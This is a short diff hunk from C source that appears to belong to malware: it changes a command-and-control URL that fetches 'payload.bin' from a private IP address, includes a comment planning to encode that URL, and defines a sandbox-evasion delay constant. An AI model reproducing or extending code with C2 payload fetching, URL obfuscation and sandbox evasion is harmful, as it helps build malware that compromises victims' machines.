@@ -24,7 +24,7 @@
     size_t len_var = 15;
 
 // TODO: encode C2 URL
-#define C2_URL "http://192.168.1.100:8080/payload.bin"
+#define C2_URL "http://192.168.100.160:8080/payload.bin"
 
 #define SANDBOX_DELAY_CYCLES 500000000
 
